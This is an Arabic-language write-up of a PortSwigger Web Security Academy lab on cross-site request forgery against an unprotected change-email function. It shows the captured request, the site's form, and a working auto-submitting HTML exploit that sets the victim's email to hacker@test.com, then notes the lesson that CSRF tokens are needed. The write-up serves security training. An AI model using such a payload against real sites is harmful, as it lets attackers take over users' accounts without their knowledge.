
فكرة السيناريو هو ان مفيش اي حماية خالص علي الcsrf علي فانكشن ال `change email` بمعني أن مفيش اي `csrf token` ف كان ده شكل ال request
```HTTP
POST /my-account/change-email HTTP/2
Host: 0ae100a90470eeabad244bc70046007f.web-security-academy.net
Cookie: session=a830YAygDKtjsWFRxKfvk0JteyJLCjvK
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0ae100a90470eeabad244bc70046007f.web-security-academy.net
Referer: https://0ae100a90470eeabad244bc70046007f.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

email=test%40test.com
```
وكان ده ال `form` بتاعت الفانكشن 
```HTML
<form class="login-form" name="change-email-form" action="[/my-account/change-email](view-source:https://0ae100a90470eeabad244bc70046007f.web-security-academy.net/my-account/change-email)" method="POST">
<label>Email</label>
<input required type="email" name="email" value="">
<button class='button' type='submit'> Update email </button>
</form>
```
فأستخدمتها عشان اعمل `exploit` للثغرة ف الكود النهائي كان ده
```HTML
<form action="https://0a600026033ba86d807cee6c00f400b1.web-security-academy.net/my-account/change-email" method="POST">
        <input required type="email" name="email" value="hacker@test.com">
        <button class='button' type='submit'> Update email </button>
</form>

<script> document.forms[0].submit(); </script>
```
واللي معناه انه لما يشتغل الكود هيتم تغيير الايميل الي `hacker@test.com`


### نتعلم اي من اللاب ده ؟

* ان مينفعش يبقي مفيش حماية علي ال `csrf token` 